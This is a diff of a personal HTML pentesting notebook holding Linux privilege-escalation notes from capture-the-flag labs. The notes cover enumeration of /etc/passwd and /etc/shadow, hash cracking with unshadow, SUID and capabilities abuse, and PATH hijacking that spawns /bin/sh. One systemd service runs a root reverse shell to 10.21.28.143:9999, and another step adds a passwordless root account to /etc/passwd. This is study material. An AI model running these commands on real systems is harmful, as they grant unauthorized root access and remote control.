@@ -1,22 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Personal - My Notebook Website</title>
-    <link rel="stylesheet" href="../Static/styles.css">
-    <img src="../img/logo.jpg" alt="Logo" class="logo">
-</head>
-<body>
-    <header>
-        <h1>Welcome to My Notebook</h1>
-        <nav>
-            <ul>
-                <li><a href="../Main.html">Home</a></li>
-            </ul>    
-        </nav>
-    </header>
-    
 <h1 id="-linux-">... LINUX ...</h1>
 <h2 id="hostname">hostname</h2>
 <ul>
@@ -46,18 +27,16 @@
 <h2 id="-etc-passwd">/etc/passwd</h2>
 </li>
 <li><p>Reading the /etc/passwd file can be an easy way to discover users on the system.
-  <code>cat /etc/passwd | cut -d &quot;:&quot; -f 1</code>
+  <code>cat /etc/passwd | cut -d ":" -f 1</code>
   <code>cat /etc/passwd | grep home</code></p>
 <h2 id="netstat">netstat</h2>
 </li>
-<li><p>netstat -a: shows all listening ports and established connections.
-netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
-netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections.
-This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
-netstat -s:list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.</p>
+<li><p>netstat -tlnp</p>
 <h2 id="find">find</h2>
 </li>
 <li><p><strong>find / -perm -u=s -type f 2&gt;/dev/null</strong>  : find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. </p>
+</li>
+<li><p>find / -name config.php 2&gt;/dev/null </p>
 <h2 id="cat-etc-shadow">cat /etc/shadow</h2>
 </li>
 <li><p>This file stores the encrypted password hashes for user accounts on the system.  </p>
@@ -79,7 +58,7 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <li>use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).  </li>
 </ul>
 <p>=========================================================================================================</p>
-<h2 id="2-privilege-escalation-suid">2. Privilege Escalation: SUID</h2>
+<h2 id="2-privilege-escalation-suid">2. Privilege Escalation: <a href="https://gtfobins.github.io/">SUID</a></h2>
 </li>
 <li><p><strong>find / -type f -perm -04000 -ls 2&gt;/dev/null</strong></p>
 <ul>
@@ -93,7 +72,7 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <li>unshadow passwd.txt shadow.txt &gt; passwords.txt</li>
 <li><p>/home/ubuntu/flag3.txt | base64 --decode</p>
 <p>==========================================================================================================</p>
-<h2 id="3-privilege-escalation-capabilities">3. Privilege Escalation: Capabilities</h2>
+<h2 id="3-privilege-escalation-capabilities">3. Privilege Escalation: <a href="https://gtfobins.github.io/">Capabilities</a></h2>
 </li>
 <li><p>getcap</p>
 </li>
@@ -107,7 +86,7 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <ul>
 <li><p>folder you have write access for.</p>
 </li>
-<li><p>echo cat /home/matt/flag6.txt&quot; &gt; thm</p>
+<li><p>echo cat /home/matt/flag6.txt" &gt; thm</p>
 </li>
 <li><p>export PATH=/home/murdoch:$PATH</p>
 </li>
@@ -122,7 +101,7 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <blockquote>
 <p>cd /tmp$</p>
 </blockquote>
-<p>echo &quot;/bin/sh&quot; &gt; cat</p>
+<p>echo "/bin/sh" &gt; cat</p>
 <p>chmod +x cat</p>
 <p>export PATH=/tmp:$PATH</p>
 <p>echo $PATH</p>
@@ -182,7 +161,7 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <li><p>migrate $servace_number$</p>
 </li>
 <li><ul>
-<li>search local exploit suggester <strong>$%Don&#39;t Forget target id same arch {x86--x64}%$</strong></li>
+<li>search local exploit suggester <strong>$%Don't Forget target id same arch {x86--x64}%$</strong></li>
 </ul>
 </li>
 </ul>
@@ -200,7 +179,7 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <p> [Service]
  Type=simple
  User=root
- ExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.21.28.143/9999 0&gt;&amp;1&#39;</p>
+ ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.21.28.143/9999 0&gt;&amp;1'</p>
 <p> [Install]
  WantedBy=multi-user.target</p>
 </li>
@@ -215,7 +194,7 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <li><p>ln -s /etc/passwd /home/larissa/test</p>
 </li>
 <li>sudo /home/larissa/vic.sh larissa rw /home/larissa/test</li>
-<li>echo &quot;root3::0:0:root3:/root:/bin/bash&quot; &gt;&gt; ./test</li>
+<li>echo "root3::0:0:root3:/root:/bin/bash" &gt;&gt; ./test</li>
 <li><p>su root3</p>
 <p>==========================================================================================================   </p>
 <ul>
@@ -225,11 +204,5 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 </ul>
 <p> ========================================================================================================== </p>
 <ul>
-<li>find / -type f -name &quot;configurations.php&quot; -exec ls -al {} \; 2&gt;/dev/null </li>
+<li>find / -type f -name "configurations.php" -exec ls -al {} \; 2&gt;/dev/null </li>
 </ul>
-
-    <footer>
-        <p>&copy;hu1k0 Notebook Website</p>
-    </footer>
-</body>
-</html>
